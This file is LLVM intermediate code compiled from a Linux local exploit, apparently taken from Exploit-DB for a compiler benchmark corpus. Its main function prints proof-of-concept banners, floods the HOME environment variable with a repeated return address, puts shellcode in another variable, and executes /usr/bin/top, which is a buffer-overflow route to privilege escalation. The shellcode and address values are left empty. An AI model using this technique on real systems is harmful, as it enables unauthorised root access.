; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_22943.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_22943.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@BS = common dso_local global i32 0, align 4
@stdout = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [37 x i8] c"\0ACopyright (c) by UHAGr 2003 - 2004\0A\00", align 1
@.str.1 = private unnamed_addr constant [40 x i8] c"/usr/bin/top Proof of Concept Exploit\0A\0A\00", align 1
@.str.2 = private unnamed_addr constant [37 x i8] c"[~] Starting exploiting proccess...\0A\00", align 1
@.str.3 = private unnamed_addr constant [30 x i8] c"[~] Using ret address: 0x%8x\0A\00", align 1
@DEFRET = common dso_local global i64 0, align 8
@.str.4 = private unnamed_addr constant [37 x i8] c"[~] Setting environmental variables\0A\00", align 1
@.str.5 = private unnamed_addr constant [5 x i8] c"HOME\00", align 1
@.str.6 = private unnamed_addr constant [9 x i8] c"setenv()\00", align 1
@.str.7 = private unnamed_addr constant [5 x i8] c"TOPX\00", align 1
@sc = common dso_local global i8* null, align 8
@.str.8 = private unnamed_addr constant [22 x i8] c"[~] Executing %s...\0A\0A\00", align 1
@TOP = common dso_local global i8* null, align 8
@.str.9 = private unnamed_addr constant [8 x i8] c"execl()\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i64, align 8
  store i32 0, i32* %1, align 4
  store i32 0, i32* %2, align 4
  %5 = load i32, i32* @BS, align 4
  %6 = zext i32 %5 to i64
  %7 = call i8* @llvm.stacksave()
  store i8* %7, i8** %3, align 8
  %8 = alloca i8, i64 %6, align 16
  store i64 %6, i64* %4, align 8
  %9 = load i32, i32* @stdout, align 4
  %10 = call i32 (i32, i8*, ...) @fprintf(i32 %9, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str, i64 0, i64 0))
  %11 = load i32, i32* @stdout, align 4
  %12 = call i32 (i32, i8*, ...) @fprintf(i32 %11, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.1, i64 0, i64 0))
  %13 = load i32, i32* @stdout, align 4
  %14 = call i32 (i32, i8*, ...) @fprintf(i32 %13, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.2, i64 0, i64 0))
  %15 = load i32, i32* @stdout, align 4
  %16 = load i64, i64* @DEFRET, align 8
  %17 = call i32 (i32, i8*, ...) @fprintf(i32 %15, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.3, i64 0, i64 0), i64 %16)
  store i32 0, i32* %2, align 4
  br label %18

18:                                               ; preds = %29, %0
  %19 = load i32, i32* %2, align 4
  %20 = load i32, i32* @BS, align 4
  %21 = sub nsw i32 %20, 1
  %22 = icmp slt i32 %19, %21
  br i1 %22, label %23, label %32

23:                                               ; preds = %18
  %24 = load i64, i64* @DEFRET, align 8
  %25 = load i32, i32* %2, align 4
  %26 = sext i32 %25 to i64
  %27 = getelementptr inbounds i8, i8* %8, i64 %26
  %28 = bitcast i8* %27 to i64*
  store i64 %24, i64* %28, align 1
  br label %29

29:                                               ; preds = %23
  %30 = load i32, i32* %2, align 4
  %31 = add nsw i32 %30, 4
  store i32 %31, i32* %2, align 4
  br label %18

32:                                               ; preds = %18
  %33 = load i32, i32* @BS, align 4
  %34 = sub nsw i32 %33, 1
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds i8, i8* %8, i64 %35
  store i8 0, i8* %36, align 1
  %37 = load i32, i32* @stdout, align 4
  %38 = call i32 (i32, i8*, ...) @fprintf(i32 %37, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.4, i64 0, i64 0))
  %39 = call i32 @setenv(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.5, i64 0, i64 0), i8* %8, i32 1)
  %40 = icmp eq i32 %39, -1
  br i1 %40, label %41, label %44

41:                                               ; preds = %32
  %42 = call i32 @perror(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.6, i64 0, i64 0))
  %43 = call i32 @exit(i32 1) #4
  unreachable

44:                                               ; preds = %32
  %45 = load i8*, i8** @sc, align 8
  %46 = call i32 @setenv(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.7, i64 0, i64 0), i8* %45, i32 1)
  %47 = icmp eq i32 %46, -1
  br i1 %47, label %48, label %51

48:                                               ; preds = %44
  %49 = call i32 @perror(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.6, i64 0, i64 0))
  %50 = call i32 @exit(i32 1) #4
  unreachable

51:                                               ; preds = %44
  %52 = load i32, i32* @stdout, align 4
  %53 = load i8*, i8** @TOP, align 8
  %54 = call i32 (i32, i8*, ...) @fprintf(i32 %52, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.8, i64 0, i64 0), i8* %53)
  %55 = load i8*, i8** @TOP, align 8
  %56 = load i8*, i8** @TOP, align 8
  %57 = call i32 @execl(i8* %55, i8* %56, i32* null)
  %58 = icmp eq i32 %57, -1
  br i1 %58, label %59, label %62

59:                                               ; preds = %51
  %60 = call i32 @perror(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.9, i64 0, i64 0))
  %61 = call i32 @exit(i32 1) #4
  unreachable

62:                                               ; preds = %51
  store i32 0, i32* %1, align 4
  %63 = load i8*, i8** %3, align 8
  call void @llvm.stackrestore(i8* %63)
  %64 = load i32, i32* %1, align 4
  ret i32 %64
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @fprintf(i32, i8*, ...) #2

declare dso_local i32 @setenv(i8*, i8*, i32) #2

declare dso_local i32 @perror(i8*) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32 @execl(i8*, i8*, i32*) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
